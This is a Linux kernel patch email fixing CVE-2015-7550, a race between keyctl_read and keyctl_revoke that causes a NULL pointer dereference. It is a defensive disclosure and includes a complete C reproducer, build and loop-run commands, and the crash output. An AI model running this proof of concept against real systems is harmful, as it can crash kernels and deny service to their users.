Subject: [PATCH] KEYS: Fix race between read and revoke

This fixes CVE-2015-7550.

There's a race between keyctl_read() and keyctl_revoke().  If the revoke
happens between keyctl_read() checking the validity of a key and the key's
semaphore being taken, then the key type read method will see a revoked key.

This causes a problem for the user-defined key type because it assumes in
its read method that there will always be a payload in a non-revoked key
and doesn't check for a NULL pointer.

Fix this by making keyctl_read() check the validity of a key after taking
semaphore instead of before.

I think the bug was introduced with the original keyrings code.

This was discovered by a multithreaded test program generated by syzkaller
(http://github.com/google/syzkaller).  Here's a cleaned up version:

	#include <sys/types.h>
	#include <keyutils.h>
	#include <pthread.h>
	void *thr0(void *arg)
	{
		key_serial_t key = (unsigned long)arg;
		keyctl_revoke(key);
		return 0;
	}
	void *thr1(void *arg)
	{
		key_serial_t key = (unsigned long)arg;
		char buffer[16];
		keyctl_read(key, buffer, 16);
		return 0;
	}
	int main()
	{
		key_serial_t key = add_key("user", "%", "foo", 3, KEY_SPEC_USER_KEYRING);
		pthread_t th[5];
		pthread_create(&th[0], 0, thr0, (void *)(unsigned long)key);
		pthread_create(&th[1], 0, thr1, (void *)(unsigned long)key);
		pthread_create(&th[2], 0, thr0, (void *)(unsigned long)key);
		pthread_create(&th[3], 0, thr1, (void *)(unsigned long)key);
		pthread_join(th[0], 0);
		pthread_join(th[1], 0);
		pthread_join(th[2], 0);
		pthread_join(th[3], 0);
		return 0;
	}

Build as:

	cc -o keyctl-race keyctl-race.c -lkeyutils -lpthread

Run as:

	while keyctl-race; do :; done

as it may need several iterations to crash the kernel.  The crash can be
summarised as:

	BUG: unable to handle kernel NULL pointer dereference at 0000000000000010
	IP: [<ffffffff81279b08>] user_read+0x56/0xa3
	...
